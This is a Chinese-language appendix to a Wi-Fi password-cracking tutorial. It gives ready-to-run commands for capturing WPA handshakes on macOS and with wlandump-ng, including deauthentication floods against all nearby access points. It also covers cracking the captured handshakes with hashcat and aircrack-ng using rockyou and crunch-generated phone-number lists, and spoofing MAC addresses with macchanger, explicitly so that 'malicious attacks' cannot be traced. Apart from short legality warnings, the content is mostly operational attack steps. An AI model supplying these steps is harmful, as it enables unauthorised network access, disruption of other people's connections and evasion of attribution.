# 附录
在本教程初次发布之后，来自互联网各个角落的一些人提出了意见和建议。 在努力保持原始教程简短而优美的基础上，我在这里介绍了有关他们精彩建议的信息，并添加了我自己的一些。 在这里，你可以找到以下信息：

- 在MacOS/OSX上破解WI-FI
- 利用`landump-ng`捕获握手
- 利用`crunch`生成单词列表
- 利用`macchanger`保护你的身份

## 在MacOS/OSX上破解WI-FI

非常感谢[@harshpatel991](https://github.com/harshpatel991)提供本指南。以下说明如何使用内置的MacOS/OSX工具捕获4路握手和naive-hashcat来确定WPA/WPA2无线网络的密码。 此方法已在OSX 10.10和10.12版上进行了测试，但也可能与其他版本一起使用。 像主教程一样，它假设你有一个[无线网卡](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html)支持[监视模式](https://en.wikipedia.org/wiki/Monitor_mode)。我们已经在2012年上半年和2015年中期MacBook Pro上取得了巨大的成功。

### 无线诊断工具

幸运的是，OSX配备了一套无线诊断工具。 要打开它们，请按住键盘上的选项键，然后单击菜单栏中的Wi-Fi图标。 然后点击“打开无线诊断...”

### 决定目标网络信道

打开无线诊断程序，单击窗口>扫描。 找到目标网络，注意其信道和宽度。

### 捕获一个4路握手

1. 打开无限诊断，点击窗口>嗅探器。选择你在上一步中找到的信道和宽度。
2. 现在，你需要等待设备连接到目标网络。如果你正在网络上测试（你应该），请重新连接无线设备以捕获握手。
3. 一旦你认为已经捕获手握手，请点击停止。
4. 根据你的操作系统版本，`.wcap`捕获文件将被保存到桌面或`/var/tmp/`。
5.将捕获文件转换为`.hccapx`，将其上传到https://hashcat.net/cap2hccapx/。 如果你捕获到任何握手，站点将开始下载一个`.hccapx`文件。 如果没有，将不会提示下载。

### 利用`naive-hashcat`破解密码

```bash
# 克隆naive-hashcat
git clone https://github.com/brannondorsey/naive-hashcat
cd naive-hashcat

# 在MacOS/OSX上构建源代码
./build-hashcat-osx.sh

# 下载134MB rockyou字典文件
curl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

最后，运行`naive-hashcat.sh`。将`handshake.hccapx`的名称改成你从[hashcat.net](https://hashcat.net/cap2hccapx/)下载的文件名称。`cracked.pot`是输出文件名称。

```
HASH_FILE=handshake.hccapx POT_FILE=cracked.pot HASH_TYPE=2500 ./naive-hashcat.sh
```

再次感谢[@harshpatel991](https://github.com/harshpatel991)，以及感谢[phillips321](http://www.phillips321.co.uk/)他的在OSX上构建hashcat的[帖子](https://www.phillips321.co.uk/2016/07/09/hashcat-on-os-x-getting-it-going/)。

## 利用`wlandump-ng`来捕获握手

[@enilfodne](https://github.com/enilfodne)已经[告诉我](https://github.com/brannondorsey/wifi-cracking/issues/15)hashcat社区对于捕获WPA 4路握手有了更好的工具，叫做`wlandump-ng`。这个工具属于与hashcat相关的工具集[hcxtools](https://github.com/ZerBea/hcxtools)系列之中，由[ZerBea](https://github.com/ZerBea)开发，名声已经超过了`airdump-ng`。`wlandump-ng`允许你一次性从每个附近的网络上全面捕获握手信息，跳过Wi-Fi信道，以增加收集。


```bash
# 克隆hcxtools
git clone https://github.com/ZerBea/hcxtools
cd hcxtools

# 构建并且安装
# 你将可能需要apt来安装需要的依赖
# https://github.com/ZerBea/hcxtools#requirements
make
sudo make install

# 覆盖所有失去从附近接入点失去连接的客户端并且监听重新连接
# 将wlan0替换成你的无线设备名称
wlandump-ng -i wlan0 -o capture.cap -c 1 -t 60 -d 100 -D 10 -m 512 -b -r -s 20 

# 一旦你获得了捕获的文件，你可以利用以下命令将其转换成hashcat捕获格式
cap2hccapx.bin capture.cap capture.hccapx
```

`wlandump-ng`命令行参数（使用`h`标志来获得完整列表）：

- `-c 1`：从通道1开始的2.4Ghz范围（将转到13）
- `-t 60'：每个通道停留60s（实验值较低，默认值为5）
- `-d 100`：发送deauth每100个信标帧
- `-D 10`：每隔10个信标帧发送解析数据包
- “-m 512”：内部缓冲区大小，对于低资源机器使用512
- `-b`：激活信号到最后10个探测请求
- `-r`：如果循环在通道1上，则重置deauthentication / detachosciation计数器
- `-s 20`：显示20条状态行

**警告：**在大多数地方使用这个是不合法的。更多信息请参考[这]((https://github.com/ZerBea/hcxtools#warning)。

`wlandump-ng`也提供了在被动模式下运行的选项，而不会发送任何解除认证/解除关联帧。 如果你对中断你周围的人的网络活动（你应该是）敏感，则建议你这样做。代价是你将获得的握手少得多，这种方法使得捕获不可见。

```bash
# 在被动模式下使用默认设置运行
wlandump-ng -i wlan0 -o capture.cap -p -s 20 
```

## 使用`crunch`生成单词列表

`crunch`是使用给定字符串或模式的组合生成单词列表的工具。 我们可以使用crunch来即时生成密码列表，并将其管理为`aircrack-ng`，而不会将单词列表保存到磁盘。


```bash
# 安装crunch
sudo apt-get install crunch
```

要想知道如何运行crunch，可以从命令行运行（一旦开始发送密码，就可以按`ctrl-c`）：

```bash
# 语法8 8是生成密码的最小长度和最大长度
# 01234567890是组合/排列构成密码的一组字符
crunch 8 8 0123456789
```

```
Crunch现在将生成以下数据量：900000000字节
858 MB
0 GB
0 TB
0 PB
Crunch现在将生成以下行数：100000000
00000000
00000001
00000002
00000003
00000004
00000005
00000006
00000007
00000008
00000009
...
99999999
```

我们可以将`crunch`的输出作为输入输出到`aircrack-ng`，使用它生成的密码作为我们的单词列表。 这里我们使用`crunch`特殊规则字符`%`来表示数字。 此命令尝试破解10位电话号码的WPA密码（使用crunch即时生成的102GB的号码）：

```bash
# 我们也可以使用-t "@^%,"  使用模式'@' 替换小写 ',' －替换大写
# '%' －替换数字以及'^' －替换特殊字符
# *************** 不要忘记最后的'-'
crunch 10 10 -t "%%%%%%%%%%" | aircrack-ng -a2 capture.cap -b 58:98:35:CB:A2:77 -w -
```

感谢[@hiteshnayak305](https://github.com/hiteshnayak305)介绍`crunch`并将此次更新作为[PR](https://github.com/brannondorsey/wifi-cracking/pull/17)。

## 利用`macchanger`魄户你的身份

每当您使用Wi-Fi进行任何远程恶意攻击时，最好是伪造你的Wi-Fi设备的MAC地址，以便记录的任何网络流量都不能与设备制造商分配的串行连接。

这是利用`macchanger`的一个小尝试：

```bash
# 下载MAC changer
sudo apt-get install macchanger

# 关闭设备
sudo ifconfig wlan0 down

# 改变mac
# -A 为有效的供应商分配一个随机的MAC w/a
# -r 让它真正随机
# -p 将其恢复到原始的硬件MAC
sudo macchanger -A wlan0

# 启动设备
sudo ifconfig wlan0 up
```

如果你有多张无线网卡，那么改变所有无线网卡的MAC是个好主意。 或者更好的是，当你尝试捕获握手时，将未使用的无线接口关闭，尽可能少地留下痕迹。 请注意，欺骗更改在重新启动时不会持续。
